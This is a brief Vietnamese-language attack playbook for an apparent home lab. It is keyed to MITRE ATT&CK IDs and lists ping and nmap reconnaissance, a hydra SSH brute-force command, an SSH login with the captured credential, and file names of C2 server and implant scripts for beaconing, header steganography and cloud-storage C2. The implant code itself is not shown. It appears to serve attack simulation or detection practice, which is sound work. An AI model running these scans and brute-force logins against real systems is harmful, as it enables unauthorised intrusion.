# Attack Playbook - Chay tu Kali (192.168.56.30)

## T1018 - Trinh sat host
ping -c 10 192.168.56.20

## T1046 - Quet cong
nmap -sS -p 1-1000 192.168.56.20
nmap -sV -p 22,80,443 192.168.56.20

## T1110 - Brute force SSH
hydra -l victim -P pass.txt ssh://192.168.56.20 -t 4

## T1078 - Dang nhap bang credential vua lay
ssh victim@192.168.56.20

## T1071.001 HTTP GET Beaconing
server_t1.py
implant_t1.py

## T1001.002 C2 Header Steganography
server_t2.py
implant_t2.py

## T1102 Web Service C2 (Cloud Storage C2)
mock_gdrive.py
implant_gdrive.py
